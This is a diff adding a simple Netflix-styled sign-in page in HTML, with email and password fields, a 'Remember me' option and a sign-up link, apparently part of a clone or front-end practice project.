@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login • Netflix</title>
+  <link rel="stylesheet" href="login.css">
+</head>
+<body>
+
+<div class="overlay"></div>
+
+<div class="login-box">
+  <h1>Sign In</h1>
+
+  <input type="email" id="email" placeholder="Email or phone number">
+  <input type="password" id="password" placeholder="Password">
+
+  <button id="loginBtn" onclick="login()">Sign In</button>
+
+  <div class="options">
+    <label><input type="checkbox"> Remember me</label>
+    <span>Need help?</span>
+  </div>
+
+  <p class="signup-text">
+    New to Netflix?
+    <a href="signup.html" style="cursor:pointer; color:#fff; font-weight:bold;">
+      Sign up now
+    </a>
+  </p>
+</div>
+
+<script src="login.js"></script>
+
+</body>
+</html>
